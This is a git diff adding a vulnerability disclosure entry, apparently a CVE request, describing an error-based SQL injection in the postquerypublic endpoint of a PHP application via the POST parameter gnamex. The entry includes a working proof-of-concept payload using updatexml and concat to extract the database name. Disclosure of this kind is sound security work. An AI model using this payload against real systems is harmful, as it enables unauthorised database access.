@@ -171,3 +171,14 @@ Poc SQLi:
 <img width="1629" height="1153" alt="image" src="https://github.com/user-attachments/assets/8291abdd-68b9-4f6d-80e6-a689f4022d80" />
 
 
+
+___
+CVE Request 1897846 - NO DUPLICATE 
+- Presentation: SQLi (SQl Injection)-  via POST gnamex parameter
+- Security vulnerability: Sql Injection Error Based
+- Vulnerability Type: Injection
+- Affected Component: postquerypublic endpoint — POST parameter gnamex
+  
+Poc:
+- gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!
+- https://github.com/carlosalbertotuma/CLOUD-CLASSROOMS-php-1.0
